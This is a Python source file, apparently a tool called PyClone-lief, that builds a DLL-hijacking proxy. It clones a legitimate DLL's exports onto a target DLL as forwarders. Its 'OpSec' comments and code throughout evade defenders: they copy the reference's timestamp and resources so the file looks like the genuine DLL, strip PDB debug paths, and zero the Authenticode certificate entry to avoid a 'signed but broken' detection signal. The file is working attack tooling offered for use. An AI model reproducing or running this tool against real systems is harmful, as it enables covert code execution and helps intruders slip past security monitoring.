import sys
import argparse
import lief

REQUIRED_LIEF_MAJOR = 1


def _lief_version_tuple():
    ver = getattr(lief, '__version__', '0')
    parts = []
    for chunk in ver.split('.'):
        digits = ''
        for ch in chunk:
            if ch.isdigit():
                digits += ch
            else:
                break
        parts.append(int(digits) if digits else 0)
    while len(parts) < 3:
        parts.append(0)
    return tuple(parts[:3])


def _clone_exports(target_path, reference_path, ref_display_path, output_path,
                   verbose=False, copy_resources=False):
    target = lief.PE.parse(target_path)
    reference = lief.PE.parse(reference_path)

    if target is None:
        raise SystemExit('[!] Failed to parse target: {}'.format(target_path))
    if reference is None:
        raise SystemExit('[!] Failed to parse reference: {}'.format(reference_path))
    if not reference.has_exports:
        raise SystemExit('[!] Reference DLL has no exports')

    # Arch guard: producing an output with mismatched PE32 / PE32+ magic is silent corruption.
    if target.optional_header.magic != reference.optional_header.magic:
        raise SystemExit(
            '[!] Architecture mismatch: target is {}, reference is {}'.format(
                target.optional_header.magic.name,
                reference.optional_header.magic.name,
            )
        )

    # Forwards don't typically supply an extension
    if ref_display_path.lower().endswith('.dll'):
        ref_display_path = ref_display_path[:-4]

    ref_export = reference.get_export()

    # If the reference's own exports are themselves forwarders, our clone will chain-forward
    # through them. Windows resolves this at runtime, but the caller might want to know.
    already_forwarded = sum(1 for e in ref_export.entries if e.is_forwarded)
    if already_forwarded:
        print(
            '[i] Reference has {} existing forwarder(s); cloned exports will chain through '
            'them at runtime.'.format(already_forwarded),
            file=sys.stderr,
        )

    # Export.copy() carries: name (DLL Name field), ordinal_base, timestamp,
    # major_version, minor_version, and every entry. Preserving these transparently
    # is the whole reason this backend is simpler than the pefile one.
    new_export = ref_export.copy()

    for entry in new_export.entries:
        if entry.name:
            entry.set_forward_info(ref_display_path, entry.name)
        else:
            entry.set_forward_info(ref_display_path, '#{}'.format(entry.ordinal))

    target.set_export(new_export)

    # OpSec: match the reference's PE header timestamp so the cloned DLL looks like a twin.
    # (lief 1.0 exposes RichHeader read-only, so we can't normalize that yet; the target's
    # rich header from its own compile is what ships.)
    target.header.time_date_stamps = reference.header.time_date_stamps

    # OpSec: drop CodeView PDB path and any other debug entries from the target.
    # PDB paths routinely leak usernames, project directories, and build hosts.
    if target.has_debug:
        target.clear_debug()

    # OpSec: our edits invalidate any Authenticode signature the target had.
    # Zero the Certificate DataDirectory so the file reads as "unsigned"
    # instead of "signed but broken" (the latter is a defender signal on its own).
    cert_dir = target.data_directory(lief.PE.DataDirectory.TYPES.CERTIFICATE_TABLE)
    cert_dir.rva = 0
    cert_dir.size = 0

    config = lief.PE.Builder.config_t()
    config.exports = True
    # Drop the overlay so the stale Authenticode blob (which lives past the last
    # section) doesn't ship in the output. Pairs with the cert-directory zero above.
    config.overlay = False

    if copy_resources:
        if not reference.has_resources:
            print(
                '[!] --copy-resources requested but reference has no resource directory; '
                'target resources left untouched.',
                file=sys.stderr,
            )
        else:
            target.set_resources(reference.resources)
            config.resources = True

    target.write(output_path, config)

    if verbose:
        entries = list(new_export.entries)
        print('[i] Cloned {} entries:'.format(len(entries)))
        for entry in entries:
            display_name = entry.name if entry.name else '#{}'.format(entry.ordinal)
            print('    ord={:<5} {:<40} -> {}'.format(
                entry.ordinal, display_name, entry.forward_information,
            ))


def main(argv):
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('target', help='Target DLL for modifications')
    parser.add_argument('reference', help='Reference DLL from which the exports will be cloned')
    parser.add_argument('-o', '--out', help='Output file path (Default = <target>.clone.dll)', default=None)
    parser.add_argument('-p', '--path', help='Full path to reference DLL while being hijacked (if <reference> is not accurate)', default=None)
    parser.add_argument(
        '-s', '--section-name',
        help='(Accepted for CLI parity with PyClone-pefile; lief manages section placement itself and ignores this)',
        default='.rdata2',
    )
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Print each cloned entry and its forward target')
    parser.add_argument('--copy-resources', action='store_true',
                        help="Copy the reference's resource directory (icon, version info, manifest) onto the target so the output's Properties dialog matches the legitimate DLL")
    args = parser.parse_args(argv)

    if not args.path:
        args.path = args.reference
    if not args.out:
        args.out = args.target + '.clone.dll'

    print('[+] Loaded files')
    _clone_exports(
        args.target, args.reference, args.path, args.out,
        verbose=args.verbose, copy_resources=args.copy_resources,
    )
    print('\n[+] Done: {}'.format(args.out))


if __name__ == '__main__':
    if _lief_version_tuple()[0] < REQUIRED_LIEF_MAJOR:
        print(
            '[!] PyClone-lief requires lief>={}.0.0 (found {}). '
            'Install with: pip install "lief>=1.0.0"'.format(
                REQUIRED_LIEF_MAJOR,
                getattr(lief, '__version__', 'unknown'),
            ),
            file=sys.stderr,
        )
        sys.exit(1)
    sys.exit(main(sys.argv[1:]))
